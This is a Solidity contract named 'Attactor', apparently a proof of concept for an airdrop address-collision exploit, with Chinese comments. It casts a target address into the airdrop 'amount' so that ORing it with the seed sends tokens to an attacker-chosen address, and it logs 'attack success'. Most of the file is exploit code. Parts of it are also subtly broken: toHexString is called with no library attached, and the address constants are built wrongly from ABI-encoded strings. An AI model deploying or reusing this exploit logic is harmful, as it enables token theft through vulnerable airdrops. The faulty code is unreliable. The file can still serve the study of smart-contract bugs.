// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract Attactor {
    
    uint256 airdropAmount = 300;
    mapping(address => uint256) public _balances;
    address public target;
    event BytesValue(bytes value);

    address public from =
        address(
            bytes20(abi.encode("0x5B38Da6a701c568545dCfcB03FcB875f56beddC4"))
        );
    address public to =
        address(
            bytes20(abi.encode("0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2"))
        );


    // 0xd266Fb4a78bF6C93b6adb9493cd434A7dFA403E1
    function performAttack(address _target) external returns (bool) {
        target = _target;
        //攻击的关键，将自己的地址包装成数量，在接下来的空投中就会再向该地址空投代币
        uint160 targetToAmount = uint160(_target);
        console.log("_target---->targetToAmount: ", targetToAmount);
        _airdrop(targetToAmount);
        return true;
    }


    function _airdrop(uint256 tAmount) public {
        uint256 seed = (uint160(msg.sender) | block.number) ^ (uint160(from) ^ uint160(to));
        console.log("origin seed: ", seed.toHexString());

        address airdropAddress;
        for (uint256 i; i < airdropAmount; ) {

            airdropAddress = address(uint160(seed | tAmount));
            _balances[airdropAddress] = airdropAmount;

            if (target == airdropAddress) {
                console.log("attack success!!! ");
                console.log("airdropAddress: ", airdropAddress);
                console.log("airdropAmount: ", _balances[airdropAddress]);
                break ;
            }
            unchecked {
                ++i;
                seed = seed >> 1;
                console.log("seed: ", seed.toHexString());
            }
        }
    }

    function testStr(address _target) public pure returns(address){
        uint256 seed = uint256(0);
        console.log("_target: ", _target);
        //注意：_target的bytes保装成bytes32后，会在低位填充，导致数值放大！！！
        //再进行或运算，就无法得到本身了
        //使用test2函数，直接转成uint160即可
        uint256 targetToAmount = uint256(bytes32(abi.encodePacked(_target)));

        uint256 airdropOrResult = (seed | targetToAmount);
        console.log("targetToAmountOrResult: ", airdropOrResult);

        uint160 airdropOrResultSplit = uint160(airdropOrResult);
        console.log("airdropOrResultSplit: ", airdropOrResultSplit);
        address airdropAddress = address(airdropOrResultSplit);
        console.log("airdropAddress: ", airdropAddress);
        return airdropAddress;
    }

    function test2(address _target) public pure returns(uint160 targetToAmount) {
        targetToAmount = uint160(_target);
    }
}
